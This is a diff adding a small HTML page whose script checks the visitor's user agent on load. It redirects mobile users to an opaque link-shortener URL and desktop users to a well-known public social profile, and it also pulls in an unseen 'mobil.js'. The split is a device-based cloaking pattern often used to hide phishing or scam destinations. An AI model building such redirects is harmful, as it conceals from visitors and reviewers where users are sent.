@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect Example</title>
+    <script>
+    function redirectToDifferentWebsite() {
+    var userAgent = navigator.userAgent.toLowerCase();
+
+
+    var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(userAgent);
+    var mobileDevice = "https://maglit.me/amirichyet"
+    
+    var pcURL = "https://www.threads.net/@zuck"; 
+    var mobileURL = mobileDevice; // 
+
+  
+    if (isMobile) {
+        window.location.href = mobileURL;
+    } else {
+        window.location.href = pcURL;
+    }
+}
+
+redirectToDifferentWebsite();
+
+
+    </script>
+    <script src="mobil.js"></script>
+</head>
+<body>
+    
+</body>
+</html>
